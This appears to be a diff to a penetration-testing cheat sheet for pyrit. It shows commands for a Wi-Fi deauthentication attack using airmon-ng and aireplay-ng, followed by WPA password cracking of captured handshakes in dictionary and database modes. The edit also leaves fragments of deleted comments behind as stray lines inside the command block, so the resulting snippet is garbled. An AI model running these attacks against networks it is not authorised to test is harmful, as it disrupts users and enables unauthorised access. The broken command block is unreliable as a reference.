@@ -26,9 +26,9 @@ pyrit -h
 
 ```bash
 # Monitor and save packets while doing a deauthentication attack
-sudo airmon-ng start wlan0 $CHANNEL
-pyrit -r wlan0mon -o $PCAP stripLive
-sudo aireplay-ng --deauth 7 -a $BSSID -c $CLIENT wlan0mon
+sudo airmon-ng start $DEVICE $CHANNEL
+pyrit -r $INTERFACE -o $PCAP stripLive
+sudo aireplay-ng --deauth 7 -a $BSSID -c $CLIENT $INTERFACE
 ```
 ```bash
 # Crack the secret in dictionary mode
@@ -37,10 +37,12 @@ pyrit -r $PCAP -i $WORDLIST -b $BSSID attack_passthrough
 
 ```bash
 # Crack the secret in database mode
-pyrit -i <wordlist> import_passwords                                      ## import word list to crack WPA password in pyrit with database mode
-pyrit -e <ESSID> create_essid                                             ## adding the ESSID of the access point to the pyrit database
-pyrit batch                                                               ## creating PMKs for ESSID
-pyrit -r <capture_file> -b <AP_MAC> attack_db
+pyrit -i $WORDLIST import_passwords
+password in pyrit with database mode
+pyrit -e <ESSID> create_essid
+point to the pyrit database
+pyrit batch
+pyrit -r $CAPTURE -b $BSSID attack_db
 ```
 
 ## References
